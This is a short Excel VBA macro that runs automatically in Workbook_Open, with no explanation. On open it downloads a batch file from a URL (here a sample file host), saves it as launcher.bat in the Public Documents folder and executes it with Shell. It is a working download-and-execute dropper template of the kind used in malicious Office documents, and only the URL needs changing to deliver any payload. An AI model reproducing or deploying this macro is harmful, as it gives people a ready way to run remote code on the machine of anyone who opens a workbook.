Private Sub Workbook_Open()
    'Set your settings
    Set shell_obj = CreateObject("WScript.Shell")
    strFileURL = "https://filesamples.com/samples/code/bat/check_internet_connection.bat"
    strHDLocation = "C:\Users\Public\Documents\launcher.bat"
    RUNCMD = "C:\Users\Public\Documents\launcher.bat"
    
    'Fetch the file
    Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
    
    objXMLHTTP.Open "GET", strFileURL, False
        objXMLHTTP.send
    
    If objXMLHTTP.Status = 200 Then
        Set objADOStream = CreateObject("ADODB.Stream")
        objADOStream.Open
        objADOStream.Type = 1 'adTypeBinary
        
    objADOStream.Write objXMLHTTP.ResponseBody
        objADOStream.Position = 0 'Set the stream position to the start
    
    Set objFSO = CreateObject("Scripting.FileSystemObject")
        If objFSO.Fileexists(strHDLocation) Then objFSO.DeleteFile strHDLocation
        Set objFSO = Nothing
        
    objADOStream.SaveToFile strHDLocation
        objADOStream.Close
        Shell RUNCMD
        Set objADOStream = Nothing
        
        End If
        
    Set objXMLHTTP = Nothing
End Sub
